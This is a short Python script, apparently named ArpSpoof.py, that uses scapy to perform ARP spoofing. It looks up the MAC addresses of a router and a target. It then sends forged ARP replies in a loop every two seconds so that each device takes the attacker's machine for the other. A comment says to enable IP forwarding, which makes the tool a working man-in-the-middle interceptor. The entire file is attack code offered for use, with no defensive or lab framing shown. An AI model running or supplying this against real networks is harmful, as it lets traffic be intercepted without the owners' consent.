import scapy.all as scapy
import sys
import time
# To run the program smoothly we need to enable port forwarding with the command 'echo 1 >> /proc/sys/net/ipv4/ip_forward' in the terminal

# USAGE Example: python3 ArpSpoof.py <router ip> <target ip>

def get_mac_address(ip_address):   # Capture's the mac address of the router and the target via sending arp packet.
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc


def spoof(router_ip, target_ip, router_mac, target_mac): # Spoofing the router and the target via malicious ARP packets.
    mal_packet_target = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    mal_packet_router = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)

    scapy.send(mal_packet_router) # sending the malicious packet to the target saying that we are the router
    scapy.send(mal_packet_target) # sending the malicious packet to the router saying that we are the target


router_ip = str(sys.argv[1])  # router IP address (first argument)
target_ip = str(sys.argv[2])  # target IP address (second argument)
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))


try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("Closing Arp Spoofer...")
    exit(1)
